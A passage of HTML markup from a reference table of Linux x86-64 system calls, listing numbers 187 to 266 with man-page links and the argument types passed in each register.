data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">187</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/readahead" target="_blank">          sys_readahead        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">off_64t offset</td>      <td data-label="rdx">size_t count</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">188</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setxattr" target="_blank">          sys_setxattr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">const void* value</td>      <td data-label="r10">size_t size</td>      <td data-label="r8">int flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">189</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/lsetxattr" target="_blank">          sys_lsetxaddr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">const void* value</td>      <td data-label="r10">size_t size</td>      <td data-label="r8">int flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">190</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fsetxattr" target="_blank">          sys_fsetxaddr        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">const void&amp; value</td>      <td data-label="r10">size_t size</td>      <td data-label="r8">int flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">191</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getxattr" target="_blank">          sys_getxaddr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">void *value</td>      <td data-label="r10">size_t size</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">192</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/lgetxattr" target="_blank">          sys_lgetxattr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">void* value</td>      <td data-label="r10">size_t size</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">193</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fgetxattr" target="_blank">          sys_fgetxaddr        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">void* value</td>      <td data-label="r10">size_t size</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">194</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/listxattr" target="_blank">          sys_listxattr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">char* list</td>      <td data-label="rdx">size_t size</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">195</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/llistxattr" target="_blank">          sys_llistxattr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">char* list</td>      <td data-label="rdx">size_t size</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">196</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/flistxattr" target="_blank">          sys_flistxattr        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">char* list</td>      <td data-label="rdx">size_t size</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">197</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/removexattr" target="_blank">          sys_removexattr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">198</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/lremovexattr" target="_blank">          sys_lremovexattr        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">199</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fremovexattr" target="_blank">          sys_fremovexattr        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">200</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/tkill" target="_blank">          sys_tkill        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">int sig</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">201</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/time" target="_blank">          sys_time        </a>      </td>      <td data-label="rdi">time_t* tloc</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">202</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/futex" target="_blank">          sys_futex        </a>      </td>      <td data-label="rdi">u32* uaddr</td>      <td data-label="rsi">int op</td>      <td data-label="rdx">u32 val</td>      <td data-label="r10">struct timespec* utime</td>      <td data-label="r8">u32* uaddr2</td>      <td data-label="r9">u32 val3</td>    </tr>    <tr>      <th scope="row" data-label="rax">203</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_setaffinity" target="_blank">          sys_sched_setaffinity        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">unsigned int len</td>      <td data-label="rdx">unsigned long* user_mask_ptr</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">204</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_getaffinity" target="_blank">          sys_sched_getaffinity        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">unsigned int len</td>      <td data-label="rdx">unsigned long* user_mask_ptr</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">205</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/set_thread_area" target="_blank">          sys_set_thread_area        </a>      </td>      <td data-label="rdi">struct user_desc* u_info</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">206</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/io_setup" target="_blank">          sys_io_setup        </a>      </td>      <td data-label="rdi">unsigned nr_events</td>      <td data-label="rsi">aio_context_t* ctxp</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">207</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/io_destroy" target="_blank">          sys_io_destroy        </a>      </td>      <td data-label="rdi">aio_context_t ctx</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">208</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/io_getevents" target="_blank">          sys_io_getevents        </a>      </td>      <td data-label="rdi">aio_context_t ctx_id</td>      <td data-label="rsi">long min_nr</td>      <td data-label="rdx">long nr</td>      <td data-label="r10">struct io_event* events</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">209</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/io_submit" target="_blank">          sys_io_submit        </a>      </td>      <td data-label="rdi">aio_context_t* ctx_id</td>      <td data-label="rsi">long nr</td>      <td data-label="rdx">struct iocb** iocbpp</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">210</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/io_cancel" target="_blank">          sys_io_cancel        </a>      </td>      <td data-label="rdi">aio_context_t* ctx_id</td>      <td data-label="rsi">struct iocb* iocb</td>      <td data-label="rdx">struct io_event* result</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">211</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/get_thread_area" target="_blank">          sys_get_thread_area        </a>      </td>      <td data-label="rdi">struct user_desc* u_info</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">212</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/lookup_dcookie" target="_blank">          sys_lookup_dcookie        </a>      </td>      <td data-label="rdi">u64 cookie64</td>      <td data-label="rsi">long buf</td>      <td data-label="rdx">long len</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">213</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/epoll_create" target="_blank">          sys_epoll_create        </a>      </td>      <td data-label="rdi">int size</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">214</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_epoll_ctl_old        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">215</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_epoll_wait_old        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">216</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/remap_file_pages" target="_blank">          sys_remap_file_pages        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">unsigned long size</td>      <td data-label="rdx">unsigned long prot</td>      <td data-label="r10">unsigned long pgoff</td>      <td data-label="r8">unsigned long flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">217</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getdents64" target="_blank">          sys_getdents64        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">struct linux_dirent64* dirent</td>      <td data-label="rdx">unsigned int count</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">218</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/set_tid_address" target="_blank">          sys_set_tid_address        </a>      </td>      <td data-label="rdi">int* tidptr</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">219</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/restart_syscall" target="_blank">          sys_restart_syscall        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">220</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/semtimedop" target="_blank">          sys_semtimedop        </a>      </td>      <td data-label="rdi">int semid</td>      <td data-label="rsi">struct sembuf* tsops</td>      <td data-label="rdx">unsigned nsops</td>      <td data-label="r10">const struct timespec* timeout</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">221</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fadvise64" target="_blank">          sys_fadvise64        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">off_t offset</td>      <td data-label="rdx">size_t len</td>      <td data-label="r10">int advice</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">222</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timer_create" target="_blank">          sys_timer_create        </a>      </td>      <td data-label="rdi">const clockid_t which_clock</td>      <td data-label="rsi">struct sigevent* timer_event_spec</td>      <td data-label="rdx">timer_t* created_timer_id</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">223</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timer_settime" target="_blank">          sys_timer_settime        </a>      </td>      <td data-label="rdi">timer_t timer_id</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx">const struct itimerspec* new_setting</td>      <td data-label="r10">struct itimerspec* old_setting</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">224</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timer_gettime" target="_blank">          sys_timer_gettime        </a>      </td>      <td data-label="rdi">timer_t timer_id</td>      <td data-label="rsi">struct itimerspec* setting</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">225</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timer_getoverrun" target="_blank">          sys_timer_getoverrun        </a>      </td>      <td data-label="rdi">timer_t timer_id</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">226</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timer_delete" target="_blank">          sys_timer_delete        </a>      </td>      <td data-label="rdi">timer_t timer_id</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">227</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/clock_settime" target="_blank">          sys_clock_settime        </a>      </td>      <td data-label="rdi">const clockid_t which_clock</td>      <td data-label="rsi">const struct timespec* tp</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">228</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/clock_gettime" target="_blank">          sys_clock_gettime        </a>      </td>      <td data-label="rdi">const clockid_t which_clock</td>      <td data-label="rsi">struct timespec* tp</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">229</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/clock_getres" target="_blank">          sys_clock_getres        </a>      </td>      <td data-label="rdi">const clockid_t which_clock</td>      <td data-label="rsi">struct timespect* tp</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">230</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/clock_nanosleep" target="_blank">          sys_clock_nanosleep        </a>      </td>      <td data-label="rdi">const clockid_t which_clock</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx">const struct timespec* rqtp</td>      <td data-label="r10">struct timespec* rmtp</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">231</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/exit_group" target="_blank">          sys_exit_group        </a>      </td>      <td data-label="rdi">int error_code</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">232</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/epoll_wait" target="_blank">          sys_epoll_wait        </a>      </td>      <td data-label="rdi">int epfd</td>      <td data-label="rsi">struct epoll_event* events</td>      <td data-label="rdx">int maxevents</td>      <td data-label="r10">int timeout</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">233</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/epoll_ctl" target="_blank">          sys_epoll_ctl        </a>      </td>      <td data-label="rdi">int epfd</td>      <td data-label="rsi">int op</td>      <td data-label="rdx">int fd</td>      <td data-label="r10">struct epoll_event* event</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">234</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/tgkill" target="_blank">          sys_tgkill        </a>      </td>      <td data-label="rdi">pid_t tgid</td>      <td data-label="rsi">pid_t pid</td>      <td data-label="rdx">int sig</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">235</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/utimes" target="_blank">          sys_utimes        </a>      </td>      <td data-label="rdi">char* filename</td>      <td data-label="rsi">struct timeval* utimes</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">236</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/vserver" target="_blank">          sys_vserver        </a>      </td>      <td data-label="rdi"><strong>UNIMPLEMENTED</strong></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">237</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mbind" target="_blank">          sys_mbind        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">unsigned long len</td>      <td data-label="rdx">unsigned long mode</td>      <td data-label="r10">unsigned long *nmask</td>      <td data-label="r8">unsigned long maxnode</td>      <td data-label="r9">unsigned flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">238</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/set_mempolicy" target="_blank">          sys_set_mempolicy        </a>      </td>      <td data-label="rdi">int mode</td>      <td data-label="rsi">unsigned long* nmask</td>      <td data-label="rdx">unsigned long maxnode</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">239</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/get_mempolicy" target="_blank">          sys_get_mempolicy        </a>      </td>      <td data-label="rdi">int* policy</td>      <td data-label="rsi">unsigned long* nmask</td>      <td data-label="rdx">unsigned long maxnode</td>      <td data-label="r10">unsigned long addr</td>      <td data-label="r8">unsigned long flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">240</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mq_open" target="_blank">          sys_mq_open        </a>      </td>      <td data-label="rdi">const char* u_name</td>      <td data-label="rsi">int oflag</td>      <td data-label="rdx">mode_t mode</td>      <td data-label="r10">struct mq_attr* u_attr</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">241</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mq_unlink" target="_blank">          sys_mq_unlink        </a>      </td>      <td data-label="rdi">const char* u_name</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">242</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mq_timedsend" target="_blank">          sys_mq_timedsend        </a>      </td>      <td data-label="rdi">mqd_t mqdes</td>      <td data-label="rsi">const char* u_msg_ptr</td>      <td data-label="rdx">size_t msg_len</td>      <td data-label="r10">unsigned int msg_prio</td>      <td data-label="r8">const struct timespec* u_abs_timeout</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">243</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mq_timedreceive" target="_blank">          sys_mq_timedreceive        </a>      </td>      <td data-label="rdi">mqd_t mqdes</td>      <td data-label="rsi">char* u_msg_ptr</td>      <td data-label="rdx">size_t msg_len</td>      <td data-label="r10">unsigned int* u_msg_prio</td>      <td data-label="r8">const struct timespec* u_abs_timeout</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">244</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mq_notify" target="_blank">          sys_mq_notify        </a>      </td>      <td data-label="rdi">mqd_t mqdes</td>      <td data-label="rsi">const struct sigevent* u_notification</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">245</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mq_getsetattr" target="_blank">          sys_mq_getsetattr        </a>      </td>      <td data-label="rdi">mqd_t mqdes</td>      <td data-label="rsi">const struct mq_attr* u_mqstat</td>      <td data-label="rdx">struct mq_attr* u_omqstat</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">246</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/kexec_load" target="_blank">          sys_kexec_load        </a>      </td>      <td data-label="rdi">unsigned long entry</td>      <td data-label="rsi">unsigned long nr_segments</td>      <td data-label="rdx">struct kexec_segment* segments</td>      <td data-label="r10">unsigned long flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">247</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/waitid" target="_blank">          sys_waitid        </a>      </td>      <td data-label="rdi">int which</td>      <td data-label="rsi">pid_t upid</td>      <td data-label="rdx">struct siginfo* infop</td>      <td data-label="r10">int options</td>      <td data-label="r8">struct rusage* ru</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">248</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/add_key" target="_blank">          sys_add_key        </a>      </td>      <td data-label="rdi">const char* _type</td>      <td data-label="rsi">const char* _description</td>      <td data-label="rdx">const void* _payload</td>      <td data-label="r10">size_t plen</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">249</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/request_key" target="_blank">          sys_request_key        </a>      </td>      <td data-label="rdi">const char* _type</td>      <td data-label="rsi">const char* _description</td>      <td data-label="rdx">const char* _callout_info</td>      <td data-label="r10">key_serial_t destringid</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">250</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/keyctl" target="_blank">          sys_keyctl        </a>      </td>      <td data-label="rdi">int option</td>      <td data-label="rsi">unsigned long arg2</td>      <td data-label="rdx">unsigned long arg3</td>      <td data-label="r10">unsigned long arg4</td>      <td data-label="r8">unsigned long arg5</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">251</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ioprio_set" target="_blank">          sys_ioprio_set        </a>      </td>      <td data-label="rdi">int which</td>      <td data-label="rsi">int who</td>      <td data-label="rdx">int ioprio</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">252</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ioprio_get" target="_blank">          sys_ioprio_get        </a>      </td>      <td data-label="rdi">int which</td>      <td data-label="rsi">int who</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">253</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/inotify_init" target="_blank">          sys_inotify_init        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">254</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/inotify_add_watch" target="_blank">          sys_inotify_add_watch        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">const char* pathname</td>      <td data-label="rdx">u32 mask</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">255</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/inotify_rm_watch" target="_blank">          sys_inotify_rm_watch        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">int wd</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">256</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/migrate_pages" target="_blank">          sys_migrate_pages        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">unsigned long maxnode</td>      <td data-label="rdx">const unsigned long* old_nodes</td>      <td data-label="r10">const unsigned long* new_nodes</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">257</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/openat" target="_blank">          sys_openat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">int flags</td>      <td data-label="r10">int mode</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">258</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mkdirat" target="_blank">          sys_mkdirat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* pathname</td>      <td data-label="rdx">int mode</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">259</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mknodat" target="_blank">          sys_mknodat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">int mode</td>      <td data-label="r10">unsigned dev</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">260</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fchownat" target="_blank">          sys_fchownat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">uid_t user</td>      <td data-label="r10">gid_t group</td>      <td data-label="r8">int flag</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">261</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/futimesat" target="_blank">          sys_futimesat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">struct timeval* utimes</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">262</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/newfstatat" target="_blank">          sys_newfstatat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">struct stat* statbuf</td>      <td data-label="r10">int flag</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">263</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/unlinkat" target="_blank">          sys_unlinkat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* pathname</td>      <td data-label="rdx">int flag</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">264</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/renameat" target="_blank">          sys_renameat        </a>      </td>      <td data-label="rdi">int oldfd</td>      <td data-label="rsi">const char* oldname</td>      <td data-label="rdx">int newfd</td>      <td data-label="r10">const char* newname</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">265</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/linkat" target="_blank">          sys_linkat        </a>      </td>      <td data-label="rdi">int oldfd</td>      <td data-label="rsi">const char* oldname</td>      <td data-label="rdx">int newfd</td>      <td data-label="r10">const char* newname</td>      <td data-label="r8">int flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">266</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/symlinkat" target="_blank">          sys_symlinkat        </a>      </td>      <td data-label="rdi">const char* oldname</td>      <td 